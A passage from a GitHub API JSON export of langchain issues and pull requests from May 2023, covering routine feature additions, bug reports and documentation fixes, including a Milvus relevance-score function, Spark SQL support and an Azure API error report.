        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4387/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4387/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4387/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4387",
        "id": 1701599225,
        "node_id": "PR_kwDOIPDwls5QEkgR",
        "number": 4387,
        "title": "add milvus _similarity_search_with_relevance_scores",
        "user": {
            "login": "jxyxiangyu",
            "id": 65048993,
            "node_id": "MDQ6VXNlcjY1MDQ4OTkz",
            "avatar_url": "https://avatars.githubusercontent.com/u/65048993?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jxyxiangyu",
            "html_url": "https://github.com/jxyxiangyu",
            "followers_url": "https://api.github.com/users/jxyxiangyu/followers",
            "following_url": "https://api.github.com/users/jxyxiangyu/following{/other_user}",
            "gists_url": "https://api.github.com/users/jxyxiangyu/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jxyxiangyu/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jxyxiangyu/subscriptions",
            "organizations_url": "https://api.github.com/users/jxyxiangyu/orgs",
            "repos_url": "https://api.github.com/users/jxyxiangyu/repos",
            "events_url": "https://api.github.com/users/jxyxiangyu/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jxyxiangyu/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T08:27:05Z",
        "updated_at": "2023-05-09T08:34:11Z",
        "closed_at": "2023-05-09T08:34:11Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4387",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4387",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4387.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4387.patch",
            "merged_at": null
        },
        "body": "add _similarity_search_with_relevance_scores function in milvus.py\r\n\r\n<!--\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n<!-- Remove if not applicable -->\r\n\r\nFixes when use milvus, it will raise similarity_search_with_relevance_scores NotImplemented\r\n\r\n## Before submitting\r\n\r\n<!-- If you're adding a new integration, include an integration test and an example notebook showing its use! -->\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n<!-- For a quicker response, figure out the right person to tag with @\r\n\r\n        @hwchase17 - project lead\r\n\r\n        Tracing / Callbacks\r\n        - @agola11\r\n\r\n        Async\r\n        - @agola11\r\n\r\n        DataLoader Abstractions\r\n        - @eyurtsev\r\n\r\n        LLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11\r\n\r\n        Tools / Toolkits\r\n        - @vowelparrot\r\n -->\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4387/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4387/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4386",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4386/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4386/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4386/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4386",
        "id": 1701586717,
        "node_id": "PR_kwDOIPDwls5QEh1u",
        "number": 4386,
        "title": "Minor Change For New Wikipedia Loader",
        "user": {
            "login": "T1b4lt",
            "id": 25377374,
            "node_id": "MDQ6VXNlcjI1Mzc3Mzc0",
            "avatar_url": "https://avatars.githubusercontent.com/u/25377374?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/T1b4lt",
            "html_url": "https://github.com/T1b4lt",
            "followers_url": "https://api.github.com/users/T1b4lt/followers",
            "following_url": "https://api.github.com/users/T1b4lt/following{/other_user}",
            "gists_url": "https://api.github.com/users/T1b4lt/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/T1b4lt/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/T1b4lt/subscriptions",
            "organizations_url": "https://api.github.com/users/T1b4lt/orgs",
            "repos_url": "https://api.github.com/users/T1b4lt/repos",
            "events_url": "https://api.github.com/users/T1b4lt/events{/privacy}",
            "received_events_url": "https://api.github.com/users/T1b4lt/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2023-05-09T08:18:14Z",
        "updated_at": "2023-05-16T04:17:55Z",
        "closed_at": "2023-05-16T04:17:55Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4386",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4386",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4386.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4386.patch",
            "merged_at": "2023-05-16T04:17:55Z"
        },
        "body": "It's important for documents to have metadata[\"source\"] field, for example, for `index.query_with_sources()`\r\n\r\n\r\n@eyurtsev\r\n\r\n  \r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4386/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4386/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4385",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4385/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4385/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4385/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4385",
        "id": 1701519474,
        "node_id": "I_kwDOIPDwls5layBy",
        "number": 4385,
        "title": "Option for ConversationalChatAgent to place format instruction and tools within System Message for ChatGPT 4.0",
        "user": {
            "login": "arnabbiswas1",
            "id": 4428191,
            "node_id": "MDQ6VXNlcjQ0MjgxOTE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/4428191?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/arnabbiswas1",
            "html_url": "https://github.com/arnabbiswas1",
            "followers_url": "https://api.github.com/users/arnabbiswas1/followers",
            "following_url": "https://api.github.com/users/arnabbiswas1/following{/other_user}",
            "gists_url": "https://api.github.com/users/arnabbiswas1/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/arnabbiswas1/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/arnabbiswas1/subscriptions",
            "organizations_url": "https://api.github.com/users/arnabbiswas1/orgs",
            "repos_url": "https://api.github.com/users/arnabbiswas1/repos",
            "events_url": "https://api.github.com/users/arnabbiswas1/events{/privacy}",
            "received_events_url": "https://api.github.com/users/arnabbiswas1/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2023-05-09T07:32:07Z",
        "updated_at": "2023-09-19T16:11:37Z",
        "closed_at": "2023-09-19T16:11:36Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Issue you'd like to raise.\r\n\r\nConversationalChatAgent places `FORMAT_INSTRUCTIONS` as well as tools section within human message, not within system message. \r\n\r\nThis is fine as long as ChatGPT-3.5 is being used where LLM gives more weightage to human message than system message. But, that is not the case for ChatGPT-4 where System message has higher weightage than human message. \r\n\r\nIn fact, with ChatGPT-4, when `FORMAT_INSTRUCTIONS` is embedded within the human message, the output generated not always follow the format. However, the vice versa is not true.\r\n\r\n<s>IMHO, the [JSONDecodeError] (https://github.com/hwchase17/langchain/issues/3455) may vanish for ChatGPT-4 if we place the format instruction inside the System message.</s>\r\n\r\n### Suggestion:\r\n\r\nI have been able to modify the implementation inside `langchain.agents.conversational_chat` (below), but I guess it would be better if we change the langchain API as well.\r\n\r\nOn top of my change, I had to use the changes from this [PR](https://github.com/hwchase17/langchain/pull/3480) to handle the cases, when GPT4 is not responding with the json format.\r\n\r\n\r\n```\r\nfrom typing import Sequence, Optional, List, Any\r\n\r\nfrom pydantic import Field\r\n\r\nfrom langchain.tools.base import BaseTool\r\n\r\nfrom langchain.agents import ConversationalChatAgent\r\nfrom langchain.schema import (\r\n    BaseOutputParser,\r\n)\r\nfrom langchain.prompts.base import BasePromptTemplate\r\nfrom langchain.prompts.chat import (\r\n    ChatPromptTemplate,\r\n    HumanMessagePromptTemplate,\r\n    MessagesPlaceholder,\r\n    SystemMessagePromptTemplate,\r\n)\r\nfrom langchain.agents.agent import Agent, AgentOutputParser\r\n\r\nclass GPT4ConversationalChatAgent(ConversationalChatAgent):\r\n\r\n    @classmethod\r\n    def create_prompt(\r\n        cls,\r\n        tools: Sequence[BaseTool],\r\n        system_message: str = PREFIX,\r\n        human_message: str = SUFFIX,\r\n        input_variables: Optional[List[str]] = None,\r\n        output_parser: Optional[BaseOutputParser] = None,\r\n    ) -> BasePromptTemplate:\r\n        tool_strings = \"\\n\".join(\r\n            [f\"> {tool.name}: {tool.description}\" for tool in tools]\r\n        )\r\n        tool_names = \", \".join([tool.name for tool in tools])\r\n        _output_parser = output_parser or cls._get_default_output_parser()\r\n        format_instructions = system_message.format(\r\n            format_instructions=_output_parser.get_format_instructions()\r\n        )\r\n        final_system_prompt = format_instructions.format(\r\n            tool_names=tool_names, tools=tool_strings\r\n        )\r\n\r\n        if input_variables is None:\r\n            input_variables = [\"input\", \"chat_history\", \"agent_scratchpad\"]\r\n        messages = [\r\n            SystemMessagePromptTemplate.from_template(final_system_prompt),\r\n            MessagesPlaceholder(variable_name=\"chat_history\"),\r\n            HumanMessagePromptTemplate.from_template(human_message),\r\n            MessagesPlaceholder(variable_name=\"agent_scratchpad\"),\r\n        ]\r\n        return ChatPromptTemplate(input_variables=input_variables, messages=messages)\r\n\r\nmemory = ConversationBufferMemory(memory_key=\"chat_history\", return_messages=True)\r\n\r\nagent = GPT4ConversationalChatAgent.from_llm_and_tools(\r\n        llm=llm,\r\n        tools=tools,\r\n        system_message=PREFIX,\r\n        human_message=SUFFIX,\r\n    )\r\n\r\nagent_chain = AgentExecutor.from_agent_and_tools(agent=agent, tools=tools, verbose=True, memory=memory)\r\n```",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4385/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4385/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4384",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4384/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4384/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4384/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4384",
        "id": 1701388720,
        "node_id": "I_kwDOIPDwls5laSGw",
        "number": 4384,
        "title": "Could not use load_summarize_chain with Azure API.",
        "user": {
            "login": "Mgz-97",
            "id": 54968785,
            "node_id": "MDQ6VXNlcjU0OTY4Nzg1",
            "avatar_url": "https://avatars.githubusercontent.com/u/54968785?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Mgz-97",
            "html_url": "https://github.com/Mgz-97",
            "followers_url": "https://api.github.com/users/Mgz-97/followers",
            "following_url": "https://api.github.com/users/Mgz-97/following{/other_user}",
            "gists_url": "https://api.github.com/users/Mgz-97/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Mgz-97/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Mgz-97/subscriptions",
            "organizations_url": "https://api.github.com/users/Mgz-97/orgs",
            "repos_url": "https://api.github.com/users/Mgz-97/repos",
            "events_url": "https://api.github.com/users/Mgz-97/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Mgz-97/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2023-05-09T05:54:19Z",
        "updated_at": "2023-09-17T17:19:01Z",
        "closed_at": "2023-09-17T17:19:00Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\n\nchain = load_summarize_chain(llm, chain_type=\"refine\", verbose=True)\r\nwhen llm use AzureOpenAI\uff0c it will fail to send request, and will get this error\r\n\r\n  File \"C:\\Users\\\\.conda\\envs\\captionSummary\\lib\\site-packages\\openai\\api_requestor.py\", line 230, in request\r\n    resp, got_stream = self._interpret_response(result, stream)\r\n  File \"C:\\Users\\\\.conda\\envs\\captionSummary\\lib\\site-packages\\openai\\api_requestor.py\", line 624, in _interpret_response\r\n    self._interpret_response_line(\r\n  File \"C:\\Users\\\\.conda\\envs\\captionSummary\\lib\\site-packages\\openai\\api_requestor.py\", line 687, in _interpret_response_line\r\n    raise self.handle_error_response(\r\nopenai.error.InvalidRequestError: Resource not found\n\n### Who can help?\n\n@hwchase17 @agola11\n\n### Information\n\n- [ ] The official example notebooks/scripts\n- [X] My own modified scripts\n\n### Related Components\n\n- [X] LLMs/Chat Models\n- [ ] Embedding Models\n- [ ] Prompts / Prompt Templates / Prompt Selectors\n- [ ] Output Parsers\n- [ ] Document Loaders\n- [ ] Vector Stores / Retrievers\n- [ ] Memory\n- [ ] Agents / Agent Executors\n- [ ] Tools / Toolkits\n- [X] Chains\n- [ ] Callbacks/Tracing\n- [ ] Async\n\n### Reproduction\n\nchain = load_summarize_chain(llm, chain_type=\"refine\", verbose=True)\r\nwhen llm use AzureOpenAI\uff0c it will fail to send request, and will get this error\n\n### Expected behavior\n\nWork well with the azure API call.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4384/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4384/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4383",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4383/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4383/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4383/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4383",
        "id": 1701346328,
        "node_id": "PR_kwDOIPDwls5QDuBT",
        "number": 4383,
        "title": "query correction from when to what",
        "user": {
            "login": "Proteusiq",
            "id": 14926709,
            "node_id": "MDQ6VXNlcjE0OTI2NzA5",
            "avatar_url": "https://avatars.githubusercontent.com/u/14926709?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Proteusiq",
            "html_url": "https://github.com/Proteusiq",
            "followers_url": "https://api.github.com/users/Proteusiq/followers",
            "following_url": "https://api.github.com/users/Proteusiq/following{/other_user}",
            "gists_url": "https://api.github.com/users/Proteusiq/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Proteusiq/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Proteusiq/subscriptions",
            "organizations_url": "https://api.github.com/users/Proteusiq/orgs",
            "repos_url": "https://api.github.com/users/Proteusiq/repos",
            "events_url": "https://api.github.com/users/Proteusiq/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Proteusiq/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T05:12:38Z",
        "updated_at": "2023-05-09T16:35:55Z",
        "closed_at": "2023-05-09T14:42:47Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4383",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4383",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4383.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4383.patch",
            "merged_at": "2023-05-09T14:42:47Z"
        },
        "body": "# Minor Wording Documentation Change \r\n\r\n```python\r\nagent_chain.run(\"When's my friend Eric's surname?\")\r\n# Answer with 'Zhu'\r\n```\r\n\r\nis change to \r\n\r\n```python\r\nagent_chain.run(\"What's my friend Eric's surname?\")\r\n# Answer with 'Zhu'\r\n```\r\n\r\nI think when is a residual of the old query that was \"When\u2019s my friends Eric`s birthday?\".",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4383/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4383/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4382",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4382/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4382/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4382/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4382",
        "id": 1701344726,
        "node_id": "PR_kwDOIPDwls5QDtqV",
        "number": 4382,
        "title": "Bump to version 0.0.163",
        "user": {
            "login": "dev2049",
            "id": 130488702,
            "node_id": "U_kgDOB8cZfg",
            "avatar_url": "https://avatars.githubusercontent.com/u/130488702?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dev2049",
            "html_url": "https://github.com/dev2049",
            "followers_url": "https://api.github.com/users/dev2049/followers",
            "following_url": "https://api.github.com/users/dev2049/following{/other_user}",
            "gists_url": "https://api.github.com/users/dev2049/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dev2049/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dev2049/subscriptions",
            "organizations_url": "https://api.github.com/users/dev2049/orgs",
            "repos_url": "https://api.github.com/users/dev2049/repos",
            "events_url": "https://api.github.com/users/dev2049/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dev2049/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5010622926,
                "node_id": "LA_kwDOIPDwls8AAAABKqgJzg",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/release",
                "name": "release",
                "color": "07D4BE",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T05:11:16Z",
        "updated_at": "2023-05-09T14:51:52Z",
        "closed_at": "2023-05-09T14:51:51Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4382",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4382",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4382.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4382.patch",
            "merged_at": "2023-05-09T14:51:51Z"
        },
        "body": null,
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4382/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4382/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4381",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4381/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4381/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4381/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4381",
        "id": 1701337858,
        "node_id": "PR_kwDOIPDwls5QDsJE",
        "number": 4381,
        "title": "Add Spark SQL support",
        "user": {
            "login": "gengliangwang",
            "id": 1097932,
            "node_id": "MDQ6VXNlcjEwOTc5MzI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1097932?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/gengliangwang",
            "html_url": "https://github.com/gengliangwang",
            "followers_url": "https://api.github.com/users/gengliangwang/followers",
            "following_url": "https://api.github.com/users/gengliangwang/following{/other_user}",
            "gists_url": "https://api.github.com/users/gengliangwang/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/gengliangwang/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/gengliangwang/subscriptions",
            "organizations_url": "https://api.github.com/users/gengliangwang/orgs",
            "repos_url": "https://api.github.com/users/gengliangwang/repos",
            "events_url": "https://api.github.com/users/gengliangwang/events{/privacy}",
            "received_events_url": "https://api.github.com/users/gengliangwang/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2023-05-09T05:04:41Z",
        "updated_at": "2023-05-12T22:09:21Z",
        "closed_at": "2023-05-12T22:09:20Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4381",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4381",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4381.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4381.patch",
            "merged_at": null
        },
        "body": "# Add Spark SQL support \r\n* Add Spark SQL support, based on [SQL Database agent](https://python.langchain.com/en/latest/modules/agents/toolkits/examples/sql_database.html). It can connect to Spark via building a local/remote SparkSession.\r\n* Include a notebook example\r\n\r\nI tried some complicated queries (window function, table joins), and the tool works well. \r\nCompared to the [Spark Dataframe agent](https://python.langchain.com/en/latest/modules/agents/toolkits/examples/spark.html), this tool is able to generate queries across multiple tables.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4381/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4381/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4380",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4380/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4380/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4380/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4380",
        "id": 1701322674,
        "node_id": "PR_kwDOIPDwls5QDo_2",
        "number": 4380,
        "title": "[Feature] Updated HuggingFace LLM Creator to Support Device Customization",
        "user": {
            "login": "skcoirz",
            "id": 62768671,
            "node_id": "MDQ6VXNlcjYyNzY4Njcx",
            "avatar_url": "https://avatars.githubusercontent.com/u/62768671?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/skcoirz",
            "html_url": "https://github.com/skcoirz",
            "followers_url": "https://api.github.com/users/skcoirz/followers",
            "following_url": "https://api.github.com/users/skcoirz/following{/other_user}",
            "gists_url": "https://api.github.com/users/skcoirz/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/skcoirz/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/skcoirz/subscriptions",
            "organizations_url": "https://api.github.com/users/skcoirz/orgs",
            "repos_url": "https://api.github.com/users/skcoirz/repos",
            "events_url": "https://api.github.com/users/skcoirz/events{/privacy}",
            "received_events_url": "https://api.github.com/users/skcoirz/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5496111774,
                "node_id": "LA_kwDOIPDwls8AAAABR5gCng",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/needs%20work",
                "name": "needs work",
                "color": "F9D0C4",
                "default": false,
                "description": "PRs that need more work"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2023-05-09T04:49:06Z",
        "updated_at": "2023-11-07T04:38:33Z",
        "closed_at": "2023-11-07T04:38:33Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4380",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4380",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4380.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4380.patch",
            "merged_at": null
        },
        "body": "- As described in HuggingFace source code, `device` parameter supports multiple input types. (Link: https://github.com/huggingface/transformers/blob/v4.28.1/src/transformers/pipelines/__init__.py#L605-L607)\r\n- In this PR, it enables `cpu` only acceleration for older laptops which doesn\u2019t have powerful GPU. When the CPU core is high, the speed is pretty fast.\r\n- Example Jupyter notebook is added. All previous examples are tested.\r\n\r\nReview Request: \r\nLLM/Chat Wrappers\r\n- @hwchase17\r\n- @agola11\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4380/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4380/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4379",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4379/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4379/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4379/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4379",
        "id": 1701318779,
        "node_id": "I_kwDOIPDwls5laBB7",
        "number": 4379,
        "title": "https://huggingface.co/api/models/sentence-transformers/all-mpnet-base-v2 not found? HTTP 401",
        "user": {
            "login": "jeannekamikaze",
            "id": 1595451,
            "node_id": "MDQ6VXNlcjE1OTU0NTE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1595451?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jeannekamikaze",
            "html_url": "https://github.com/jeannekamikaze",
            "followers_url": "https://api.github.com/users/jeannekamikaze/followers",
            "following_url": "https://api.github.com/users/jeannekamikaze/following{/other_user}",
            "gists_url": "https://api.github.com/users/jeannekamikaze/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jeannekamikaze/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jeannekamikaze/subscriptions",
            "organizations_url": "https://api.github.com/users/jeannekamikaze/orgs",
            "repos_url": "https://api.github.com/users/jeannekamikaze/repos",
            "events_url": "https://api.github.com/users/jeannekamikaze/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jeannekamikaze/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 9,
        "created_at": "2023-05-09T04:46:22Z",
        "updated_at": "2023-05-09T18:47:14Z",
        "closed_at": "2023-05-09T18:47:14Z",
        "author_association": "NONE",
        "active_lock_reason": null,
